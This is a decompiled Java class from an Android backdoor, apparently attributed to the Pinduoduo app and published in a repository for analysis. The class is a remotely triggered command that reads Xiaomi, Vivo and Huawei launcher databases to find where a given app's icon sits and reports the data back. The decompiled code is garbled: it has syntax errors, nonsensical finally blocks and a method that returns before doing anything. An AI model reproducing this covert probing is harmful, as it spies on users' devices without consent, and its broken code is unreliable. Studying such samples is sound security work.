package com.google.android.sd.biz_dynamic_dex.get_icon_info;

import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.IoUtils;
import com.google.android.sd.utils.Utils;
import java.io.Closeable;
import org.json.JSONObject;

public class GetIconInfoExecutor extends DynamicCmdExecutor {
  int CMD = 77;
  
  private String maxCellX;
  
  private String maxCellY;
  
  private void getMaxCell(Context paramContext) throws Exception {
    Cursor cursor = paramContext.getContentResolver().query(getUri(), new String[] { "MAX(cellY) AS maxCellY, MAX(cellX) AS maxCellX" }, "screen!=? and screen!=? ", new String[] { "null", "-1" }, null);
    if (cursor == null)
      return; 
    cursor.moveToNext();
    this.maxCellY = cursor.getString(0);
    this.maxCellX = cursor.getString(1);
  }
  
  private String getTitle(Context paramContext, String paramString) throws PackageManager.NameNotFoundException {
    return (paramContext.getPackageManager().getPackageInfo(paramString, 128)).applicationInfo.loadLabel(paramContext.getPackageManager()).toString();
  }
  
  private Uri getUri() {
    return TextUtils.equals(Utils.getManufacturer(), "xiaomi") ? Uri.parse("content://com.miui.home.launcher.settings/favorites") : (TextUtils.equals(Utils.getManufacturer(), "vivo") ? Uri.parse("content://com.bbk.launcher2.settings/favorites") : (TextUtils.equals(Utils.getManufacturer(), "huawei") ? Uri.parse("content://com.huawei.android.launcher.settings/favorites") : null));
  }
  
  private void handleFolder(Context paramContext, JSONObject paramJSONObject) {
    Cursor cursor1;
    String str = paramJSONObject.optString("container", "-1");
    if (!isInFolder(paramContext, str))
      return; 
    Cursor cursor2 = null;
    try {
      cursor1 = paramContext.getContentResolver().query(getUri(), new String[] { "COUNT(cellX) AS folderIconCount, MAX(cellY) AS maxCellY, MAX(cellX) AS maxCellX" }, "container=?", new String[] { str }, null, null);
      cursor2 = cursor1;
      cursor1.moveToNext();
      cursor2 = cursor1;
      paramJSONObject.put("folderIconCount", cursor1.getString(0));
      cursor2 = cursor1;
      paramJSONObject.put("folderMaxCellY", cursor1.getString(1));
      cursor2 = cursor1;
    } finally {
      paramContext = null;
    } 
    IoUtils.closeQuietly((Closeable)cursor1);
  }
  
  private boolean isInFolder(Context paramContext, String paramString) {
    if ((TextUtils.equals("huawei", Utils.getManufacturer()) || TextUtils.equals("xiaomi", Utils.getManufacturer())) && TextUtils.equals(paramString, "-101"))
      return true; 
    Cursor cursor = null;
    try {
      Cursor cursor1 = paramContext.getContentResolver().query(getUri(), null, "_id=?", new String[] { paramString }, null, null);
      if (cursor1 != null) {
        cursor = cursor1;
        int i = cursor1.getCount();
        if (i > 0)
          return true; 
      } 
      return false;
    } finally {
      IoUtils.closeQuietly((Closeable)cursor);
    } 
  }
  
  private Cursor query(Context paramContext, String paramString) throws Exception {
    Uri uri = getUri();
    return TextUtils.equals(Utils.getManufacturer(), "xiaomi") ? paramContext.getContentResolver().query(uri, null, "iconPackage=? and itemType=?", new String[] { paramString, "0" }, null) : (TextUtils.equals(Utils.getManufacturer(), "vivo") ? paramContext.getContentResolver().query(uri, null, "title=? and itemType=?", new String[] { getTitle(paramContext, paramString), "30" }null) : (TextUtils.equals(Utils.getManufacturer(), "huawei") ? paramContext.getContentResolver().query(uri, null, "title=? and itemType=? ", new String[] { getTitle(paramContext, paramString), "0" }null) : null));
  }
  
  private JSONObject work(Context paramContext, String paramString) throws Exception {
    getMaxCell(paramContext);
    JSONObject jSONObject = new JSONObject();
    jSONObject.put("maxCellX", String.valueOf(this.maxCellX));
    jSONObject.put("maxCellY", String.valueOf(this.maxCellY));
    Cursor cursor = query(paramContext, paramString);
    if (cursor != null && cursor.getCount() > 0)
      while (true) {
        if (cursor.moveToNext()) {
          for (int i = 0; i < cursor.getColumnCount(); i++) {
            String str = cursor.getColumnName(i);
            try {
              jSONObject.put(str, cursor.getString(i));
            } finally {}
          } 
          continue;
        } 
        handleFolder(paramContext, jSONObject);
        return jSONObject;
      }  
    IoUtils.closeQuietly((Closeable)cursor);
    throw new Exception("cursor == null");
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    JSONObject jSONObject = new JSONObject(paramString);
    paramString = jSONObject.getString("uuid");
    String str = jSONObject.getString("pkg_name");
    CmdData cmdData = new CmdData(this.CMD, paramString, "client");
    try {
      return;
    } finally {
      str = null;
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, str.getMessage(), null));
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\da60112a4b2848adba2ac11f412cccc7-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\get_icon_info\GetIconInfoExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */